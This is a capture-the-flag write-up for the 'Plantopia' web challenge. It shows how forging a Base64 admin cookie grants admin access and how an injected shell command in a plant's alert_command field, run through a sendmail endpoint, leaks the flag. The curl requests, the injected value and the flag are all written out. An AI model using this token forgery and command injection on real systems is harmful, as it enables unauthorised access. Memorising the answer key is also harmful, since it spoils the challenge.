@@ -1,0 +1,103 @@
+Name: Plantopia
+Value: 455 points
+Category: Web
+SolveS: 97
+Author: @HuskyHacks
+
+Description:
+Plantopia is our brand new, cutting edge plant care management website! Built for hobbiests and professionals alike, it's your one stop shop for all plant care management.
+
+Please perform a penetration test ahead of our site launch and let us know if you find anything.
+
+Username: testuser
+Password: testpassword
+
+Press the Start button on the top-right to begin this challenge.
+Connect with:
+http://challenge.ctf.games:31422
+
+Solution:
+
+1. Launch the challenge, and login as the provided testuser.
+
+2. The first thing I checked out was the "API Docs" link
+
+3. Once in API docs, I tried to test some of the cmdlets via Swagger
+
+4. In order to authorize you must have a bearer token in the following format
+
+    a. Bearer token with Base64-encoded cookie. The cookie is a Base64-encoded string in the format
+       'username.isAdmin.expirationTime'. 
+       Example: 'admin.1.1695658567' encoded in Base64.
+
+       Name: Authorization
+       In: header
+
+5. I created a bearer token at CyberChef
+
+    a. testuser.1.1761160611 (the expiration time is in Unix Epoch Time)
+    b. https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=dGVzdHVzZXIuMS4xNzYxMTYwNjEx
+
+6. Testing my bearer token I was able to authenticate and receive response code 200's from my requests
+
+7. Scrolling down, I saw that that there were 3 API queries of interest
+
+    a. /api/plants/{plant_id}/edit
+    b. /api/admin/sendmail
+    c. /api/admin/logs
+
+8. Using cURL we can easily craft some requests and check the output.
+
+    a. Updating the "alert_command" for plant with ID 3 using the "edit" request
+
+      ┌──(kali㉿kali2024)-[~/CTF/huntress2024/web/plantopia]
+      └─$ curl -X 'POST' \
+        'http://challenge.ctf.games:31422/api/plants/3/edit' \
+        -H 'accept: application/json' \
+        -H 'Authorization: dGVzdHVzZXIuMS4xNzYxMTYwNjEx' \
+        -H 'Content-Type: application/json' \
+        -d '{
+        "description": "A beautiful sunflower.",
+        "sunlight_level": 100,
+        "watering_threshold": 100,
+        "alert_command": "/usr/bin/cat flag.txt; /usr/sbin/sendmail -t; "
+      }'
+      {"message":"Plant details updated"}
+
+    b. Triggering the "alert_command" for plant with ID 3 using the "sendmail" request
+
+      ┌──(kali㉿kali2024)-[~/CTF/huntress2024/web/plantopia]
+      └─$ curlcurl -X 'POST' \
+        'http://challenge.ctf.games:31422/api/admin/sendmail' \
+        -H 'accept: application/json' \
+        -H 'Authorization: dGVzdHVzZXIuMS4xNzYxMTYwNjEx' \
+        -H 'Content-Type: application/json' \
+        -d '{
+        "plant_id": 3
+      }'
+      {"message":"Sendmail command executed"}
+
+    c. Reviewing the output and grepping for the flag in the logs wih the "logs" request
+
+      ┌──(kali㉿kali2024)-[~/CTF/huntress2024/web/plantopia]
+      └─$ curlcurl -X 'GET' \
+        'http://challenge.ctf.games:31422/api/admin/logs' \
+        -H 'accept: application/json' \
+        -H 'Authorization: dGVzdHVzZXIuMS4xNzYxMTYwNjEx' | grep -oE "flag{.*?}" --color=none
+        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                       Dload  Upload   Total   Spent    Left  Speed
+      100  6210  100  6210    0     0  53317      0 --:--:-- --:--:-- --:--:-- 53534
+      flag{c29c4d53fc432f7caeb573a9f6eae6c6}\nSending mail...\n\n2024-10-23 02:37:33,173 - DEBUG - Command errors: \n2024-10-23 02:37:33,173 - INFO - 10.128.0.40 - - [23/Oct/2024 02:37:33] \"POST /api/admin/sendmail HTTP/1.1\" 200 -\n2024-10-23 02:38:39,697 - DEBUG - Decoded cookie: username=testuser, is_admin=1, expiration_time=1761160611\n"}
+
+9. Flag: flag{c29c4d53fc432f7caeb573a9f6eae6c6}
+
+Bonus: Because I like "solve scripts" I had AI turn all of these cURL commands into a an easy
+       to use solve.py script that will perform the same functions and output the flag.
+
+┌──(kali㉿kali2024)-[~/CTF/huntress2024/web/plantopia]
+└─$ python solve.py                                    
+Edit Plant Response: 200 - {"message":"Plant details updated"}
+
+Sendmail Response: 200 - {"message":"Sendmail command executed"}
+
+Flag found: flag{c29c4d53fc432f7caeb573a9f6eae6c6}
